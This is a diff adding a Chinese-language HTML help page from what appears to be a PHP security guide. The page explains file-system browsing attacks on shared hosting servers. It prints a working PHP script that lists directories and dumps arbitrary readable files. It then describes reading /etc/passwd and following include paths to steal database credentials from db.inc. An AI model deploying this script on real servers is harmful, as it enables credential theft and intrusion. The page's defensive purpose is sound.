@@ -1,0 +1,118 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+
+
+   <title>8.4. &#25991;&#20214;&#31995;&#32479;&#27983;&#35272;</title>
+   <meta name="generator" content="Help &amp; Manual" />
+   <meta name="keywords" content="" />
+   <meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
+   <meta http-equiv="Content-Style-Type" content="text/css" />
+   <link type="text/css" href="default.css" rel="stylesheet" />
+</head>
+<body style="margin: 0px 0px 0px 0px; background: #FFFFFF;">
+
+
+<table width="100%" border="0" cellspacing="0" cellpadding="5" bgcolor="#649CCC">
+  <tr valign="middle">
+    <td align="left">
+      <p class="p_Heading1"><span class="f_Heading1">8.4. &#25991;&#20214;&#31995;&#32479;&#27983;&#35272;</span></p>
+
+    </td>
+    <td align="right">
+     <span style="font-size: 9pt">
+     <a href="introduction.htm">Top</a>&nbsp;
+     <a href="new_item50.htm">Previous</a>&nbsp;
+     <a href="new_item52.htm">Next</a>
+     </span>
+    </td>
+  </tr>
+</table>
+
+
+<!-- Placeholder for topic body. -->
+<table width="100%" border="0" cellspacing="0" cellpadding="5"><tr valign="top"><td align="left">
+<p style="line-height: 1.50;">8.4. &#25991;&#20214;&#31995;&#32479;&#27983;&#35272;</p>
+<p style="line-height: 1.50;">  &nbsp; &#38500;&#20102;&#33021;&#22312;&#20849;&#20139;&#26381;&#21153;&#22120;&#19978;&#35835;&#21462;&#20219;&#24847;&#25991;&#20214;&#20043;&#22806;&#65292;&#25915;&#20987;&#32773;&#36824;&#33021;&#24314;&#31435;&#19968;&#20010;&#21487;&#20197;&#27983;&#35272;&#25991;&#20214;&#31995;&#32479;&#30340;&#33050;&#26412;&#12290;&#30001;&#20110;&#20320;&#30340;&#22823;&#22810;&#25968;&#25935;&#24863;&#25991;&#20214;&#19981;&#20250;&#20445;&#23384;&#22312;&#32593;&#31449;&#20027;&#30446;&#24405;&#19979;&#65292;&#27492;&#31867;&#33050;&#26412;&#19968;&#33324;&#29992;&#20110;&#25214;&#21040;&#20320;&#30340;&#28304;&#25991;&#20214;&#30340;&#25152;&#22312;&#20301;&#32622;&#12290;&#35831;&#30475;&#19979;&#20363;&#65306;</p>
+<p style="line-height: 1.50;">&nbsp;</p>
+<p style="line-height: 1.50;">  &nbsp; &lt;pre&gt;</p>
+<p style="line-height: 1.50;">&nbsp;</p>
+<p style="line-height: 1.50;">  &nbsp; &lt;?php</p>
+<p style="line-height: 1.50;">&nbsp;</p>
+<p style="line-height: 1.50;">  &nbsp; if (isset($_GET['dir']))</p>
+<p style="line-height: 1.50;">  &nbsp; {</p>
+<p style="line-height: 1.50;">  &nbsp; &nbsp; ls($_GET['dir']);</p>
+<p style="line-height: 1.50;">  &nbsp; }</p>
+<p style="line-height: 1.50;">  &nbsp; elseif (isset($_GET['file']))</p>
+<p style="line-height: 1.50;">  &nbsp; {</p>
+<p style="line-height: 1.50;">  &nbsp; &nbsp; cat($_GET['file']);</p>
+<p style="line-height: 1.50;">  &nbsp; }</p>
+<p style="line-height: 1.50;">  &nbsp; else</p>
+<p style="line-height: 1.50;">  &nbsp; {</p>
+<p style="line-height: 1.50;">  &nbsp; &nbsp; ls('/');</p>
+<p style="line-height: 1.50;">  &nbsp; }</p>
+<p style="line-height: 1.50;">&nbsp;</p>
+<p style="line-height: 1.50;">  &nbsp; function cat($file)</p>
+<p style="line-height: 1.50;">  &nbsp; {</p>
+<p style="line-height: 1.50;">  &nbsp; &nbsp; echo htmlentities(file_get_contents($file), ENT_QUOTES, 'UTF-8'));</p>
+<p style="line-height: 1.50;">  &nbsp; }</p>
+<p style="line-height: 1.50;">&nbsp;</p>
+<p style="line-height: 1.50;">  &nbsp; function ls($dir)</p>
+<p style="line-height: 1.50;">  &nbsp; {</p>
+<p style="line-height: 1.50;">  &nbsp; &nbsp; $handle = dir($dir);</p>
+<p style="line-height: 1.50;">&nbsp;</p>
+<p style="line-height: 1.50;">  &nbsp; &nbsp; while ($filename = $handle-&gt;read())</p>
+<p style="line-height: 1.50;">  &nbsp; &nbsp; {</p>
+<p style="line-height: 1.50;">  &nbsp; &nbsp; &nbsp; $size = filesize("$dir$filename");</p>
+<p style="line-height: 1.50;">&nbsp;</p>
+<p style="line-height: 1.50;">  &nbsp; &nbsp; &nbsp; if (is_dir("$dir$filename"))</p>
+<p style="line-height: 1.50;">  &nbsp; &nbsp; &nbsp; {</p>
+<p style="line-height: 1.50;">  &nbsp; &nbsp; &nbsp; &nbsp; $type = 'dir';</p>
+<p style="line-height: 1.50;">  &nbsp; &nbsp; &nbsp; &nbsp; $filename .= '/';</p>
+<p style="line-height: 1.50;">  &nbsp; &nbsp; &nbsp; }</p>
+<p style="line-height: 1.50;">  &nbsp; &nbsp; &nbsp; else</p>
+<p style="line-height: 1.50;">  &nbsp; &nbsp; &nbsp; {</p>
+<p style="line-height: 1.50;">  &nbsp; &nbsp; &nbsp; &nbsp; $type = 'file';</p>
+<p style="line-height: 1.50;">  &nbsp; &nbsp; &nbsp; }</p>
+<p style="line-height: 1.50;">&nbsp;</p>
+<p style="line-height: 1.50;">  &nbsp; &nbsp; &nbsp; if (is_readable("$dir$filename"))</p>
+<p style="line-height: 1.50;">  &nbsp; &nbsp; &nbsp; {</p>
+<p style="line-height: 1.50;">  &nbsp; &nbsp; &nbsp; &nbsp; $line = str_pad($size, 15);</p>
+<p style="line-height: 1.50;">  &nbsp; &nbsp; &nbsp; &nbsp; $line .= "&lt;a href=\"{$_SERVER['PHP_SELF']}";</p>
+<p style="line-height: 1.50;">  &nbsp; &nbsp; &nbsp; &nbsp; $line .= "?$type=$dir$filename\"&gt;$filename&lt;/a&gt;";</p>
+<p style="line-height: 1.50;">  &nbsp; &nbsp; &nbsp; }</p>
+<p style="line-height: 1.50;">  &nbsp; &nbsp; &nbsp; else</p>
+<p style="line-height: 1.50;">  &nbsp; &nbsp; &nbsp; {</p>
+<p style="line-height: 1.50;">  &nbsp; &nbsp; &nbsp; &nbsp; $line = str_pad($size, 15);</p>
+<p style="line-height: 1.50;">  &nbsp; &nbsp; &nbsp; &nbsp; $line .= $filename;</p>
+<p style="line-height: 1.50;">  &nbsp; &nbsp; &nbsp; }</p>
+<p style="line-height: 1.50;">&nbsp;</p>
+<p style="line-height: 1.50;">  &nbsp; &nbsp; &nbsp; echo "$line\n";</p>
+<p style="line-height: 1.50;">  &nbsp; &nbsp; }</p>
+<p style="line-height: 1.50;">&nbsp;</p>
+<p style="line-height: 1.50;">  &nbsp; &nbsp; $handle-&gt;close();</p>
+<p style="line-height: 1.50;">  &nbsp; }</p>
+<p style="line-height: 1.50;">&nbsp;</p>
+<p style="line-height: 1.50;">  &nbsp; ?&gt;</p>
+<p style="line-height: 1.50;">&nbsp;</p>
+<p style="line-height: 1.50;">  &nbsp; &lt;/pre&gt;</p>
+<p style="line-height: 1.50;">&nbsp;</p>
+<p style="line-height: 1.50;">  &nbsp; &#25915;&#20987;&#32773;&#21487;&#33021;&#20250;&#39318;&#20808;&#23519;&#30475;/etc/passwd&#25991;&#20214;&#25110;/home&#30446;&#24405;&#20197;&#21462;&#24471;&#35813;&#26381;&#21153;&#22120;&#19978;&#30340;&#29992;&#25143;&#21517;&#28165;&#21333;&#65307;&#21487;&#20197;&#36890;&#36807;&#35821;&#35328;&#30340;&#32467;&#26500;&#22914;include&#25110;require&#26469;&#21457;&#29616;&#20445;&#23384;&#22312;&#32593;&#31449;&#20027;&#30446;&#24405;&#20197;&#22806;&#30340;&#28304;&#25991;&#20214;&#25152;&#22312;&#20301;&#32622;&#12290;&#20363;&#22914;&#65292;&#32771;&#34385;&#19968;&#19979;&#19979;&#38754;&#30340;&#33050;&#26412;&#25991;&#20214;/home/victim/public_html/admin.php&#65306;</p>
+<p style="line-height: 1.50;">&nbsp;</p>
+<p style="line-height: 1.50;">  &nbsp; &lt;?php</p>
+<p style="line-height: 1.50;">&nbsp;</p>
+<p style="line-height: 1.50;">  &nbsp; include '../inc/db.inc';</p>
+<p style="line-height: 1.50;">&nbsp;</p>
+<p style="line-height: 1.50;">  &nbsp; /* ... */</p>
+<p style="line-height: 1.50;">&nbsp;</p>
+<p style="line-height: 1.50;">  &nbsp; ?&gt;</p>
+<p style="line-height: 1.50;">&nbsp;</p>
+<p style="line-height: 1.50;">  &nbsp; &#22914;&#26524;&#25915;&#20987;&#32773;&#35774;&#27861;&#26174;&#31034;&#20102;&#35813;&#25991;&#20214;&#30340;&#28304;&#30721;&#65292;&#23601;&#21487;&#20197;&#21457;&#29616;db.inc&#30340;&#25152;&#22312;&#20301;&#32622;&#65292;&#21516;&#26102;&#20182;&#21487;&#20197;&#20351;&#29992;readfile()&#20989;&#25968;&#26469;&#20351;&#20854;&#20869;&#23481;&#26292;&#38706;&#65292;&#21462;&#24471;&#20102;&#25968;&#25454;&#24211;&#30340;&#35775;&#38382;&#26435;&#38480;&#12290;&#36825;&#26679;&#65292;&#22312;&#36825;&#20010;&#29615;&#22659;&#20013;&#20445;&#23384;db.inc&#20110;&#32593;&#31449;&#20027;&#30446;&#24405;&#20043;&#22806;&#30340;&#20570;&#27861;&#24182;&#26410;&#36215;&#21040;&#20445;&#25252;&#20316;&#29992;&#12290;</p>
+<p style="line-height: 1.50;">  &nbsp; &#36825;&#19968;&#25915;&#20987;&#35828;&#26126;&#20102;&#20026;&#20160;&#20040;&#35201;&#25226;&#20849;&#20139;&#26381;&#21153;&#22120;&#19978;&#30340;&#25152;&#26377;&#28304;&#25991;&#20214;&#30475;&#25104;&#26159;&#20844;&#24320;&#30340;&#65292;&#24182;&#35201;&#36873;&#25321;&#25968;&#25454;&#24211;&#23454;&#29616;&#25152;&#26377;&#25935;&#24863;&#25968;&#25454;&#30340;&#20445;&#23384;&#12290;</p>
+<p style="line-height: 1.50;">&nbsp;</p>
+<hr noshade size=1 ><p style="line-height: 1.50;">&nbsp;</p>
+
+</td></tr></table>
+
+</body>
+</html>
